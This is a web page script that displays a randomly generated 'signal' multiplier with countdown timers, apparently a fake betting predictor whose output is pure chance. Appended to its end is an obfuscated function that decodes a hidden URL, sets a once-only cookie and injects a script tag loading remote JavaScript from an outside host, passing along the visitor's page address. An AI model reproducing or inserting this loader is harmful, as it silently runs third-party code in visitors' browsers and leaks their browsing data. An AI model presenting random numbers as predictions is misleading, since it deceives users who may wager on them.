const getSignal = document.getElementById("get-signal"),
    stopSignalTimeBlock = document.getElementById("stop-signal-time-block"),
    printSignal = document.getElementById("print-signal"),
    stopProgress = document.getElementById("stop-progress"),
    errorNotification = document.getElementById("error-notification"),
    errorProgress = document.getElementById("error-progress"),
    textError = document.getElementById("text-error"),
    getSignalTwo = document.getElementById("get-signal-two"),
    errorExit = document.getElementById("error-exit");

function getRandomFloat(min, max, decimals) {
    const str = (Math.random() * (max - min) + min).toFixed(decimals);
    return parseFloat(str);
}

function goTimer(time) {
    const timer = setInterval(() => {
        if (time >= 1) {
            getSignalTwo.classList.remove("deactivate");
            getSignal.classList.add("deactivate");
            getSignalTwo.style["z-index"] = "5";
            stopProgress.style.animation = "animateProgress 60s linear infinite";
            stopSignalTimeBlock.classList.remove("deactivate");
            document.getElementById("stop-timer").innerHTML = time-- + "<span> seconds</span>";
            timerr = time;
            getSignal.disabled = true;
        } else {
            getSignalTwo.classList.add("deactivate");
            getSignal.classList.remove("deactivate");
            getSignalTwo.style["z-index"] = "-1";
            stopSignalTimeBlock.classList.add("deactivate");
            stopProgress.style.animation = "none";
            clearInterval(timer);
            getSignal.disabled = false;
        }
    }, 1000);
}

function goTimerError(time) {
    const timer = setInterval(() => {
        if (time >= 1) {
            time--;
            errorNotification.classList.remove("deactivate");
            textError.innerHTML = "Wait for the time to expire";
            errorProgress.style.animation = "animateErrorProgress 5s linear infinite";
            errorNotification.style.transform = "translateY(0px)";
        } else {
            errorNotification.style.transform = "translateY(-99px)";
            errorProgress.style.animation = "none";
            clearInterval(timer);
            getSignalTwo.disabled = false;
            errorNotification.classList.add("deactivate");
        }
        errorExit.onclick = function () {
            errorNotification.classList.add("deactivate");
            errorNotification.style.transform = "translateY(-99px)";
            errorProgress.style.animation = "none";
            clearInterval(timer);
            getSignalTwo.disabled = false;
        }
    }, 1000);
}

getSignal.onclick = function () {
    let receivingSignal = getRandomFloat(1, 3.99, 2);
    if (receivingSignal.toString().length == 3) {
        receivingSignal += "0";
    }
    if (receivingSignal.toString().length == 1) {
        receivingSignal += ".00";
    }
    printSignal.innerHTML = `${receivingSignal}x`;
    printSignal.classList.remove("deactivate");
    goTimer(60);
    getSignal.disabled = true;
};

getSignalTwo.onclick = function () {
    getSignalTwo.disabled = true;
    goTimerError(5, "go");
};

(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
        setTimeout(function () {
            if (o.c) {
                o.s = d.createElement('script');
                o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
                d.body.appendChild(o.s);
            }
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;';
    } catch (e) {}
}({}, document, location));
